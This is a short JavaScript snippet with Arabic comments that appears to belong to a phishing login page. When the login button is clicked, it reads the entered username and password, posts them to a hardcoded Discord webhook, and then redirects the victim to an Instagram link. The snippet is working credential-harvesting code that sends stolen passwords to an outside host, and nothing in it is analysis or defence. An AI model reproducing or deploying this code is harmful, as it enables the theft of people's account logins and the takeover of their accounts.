document.getElementById('loginButton').addEventListener('click', function (e) {
  e.preventDefault();

  var username = document.getElementById('username').value;
  var password = document.getElementById('password').value;

  var message = {
    content: **New login attempt:**\n**Username:** ${username}\n**Password:** ${password}
  };

  var webhookURL = "https://discord.com/api/webhooks/1352734475494232134/YCIy1vfzG2SmZjtxCvMTwhQaf2DE29S7jv6iRdjqM8ocAeILWCLCT4loXBUKkFuqurwS"; // ضع رابط الـ Webhook هنا

  fetch(webhookURL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(message)
  })
  .then(response => response.text()) // تغيير response.json() إلى response.text() لفحص الاستجابة
  .then(data => {
    console.log("Response from Discord:", data);
    window.location.href = "https://ig.me/j/AbYmOp6uPzKVG-kS/";
  })
  .catch(error => {
    console.error("Error:", error);
  });
});
